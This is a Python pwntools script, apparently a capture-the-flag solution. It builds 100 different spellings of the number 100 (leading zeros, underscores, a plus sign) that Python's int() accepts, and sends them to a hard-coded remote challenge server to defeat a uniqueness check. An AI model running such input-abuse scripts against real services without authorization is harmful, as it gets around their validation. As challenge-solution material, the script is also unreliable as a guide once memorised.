import itertools
from pwn import *


def generate_100_payloads():
    payloads = set()
    for z in range(8):
        base = "0" * z + "100"
        gaps = len(base) - 1
        for p in itertools.product(["", "_"], repeat=gaps):
            s = base[0]
            for i in range(gaps):
                s += p[i] + base[i + 1]
            if len(s) <= 10 and int(s) == 100:
                payloads.add(s)
            s_plus = "+" + s
            if len(s_plus) <= 10 and int(s_plus) == 100:
                payloads.add(s_plus)
            if len(payloads) >= 100:
                return list(payloads)[:100]


def main():
    payloads = generate_100_payloads()

    io = remote("34.170.146.252", 23793)

    for i, payload in enumerate(payloads):
        io.sendlineafter(b"100? ", payload.encode())
        print(f"[{i+1}/100] Sent: {payload}")

    io.interactive()


if __name__ == "__main__":
    main()
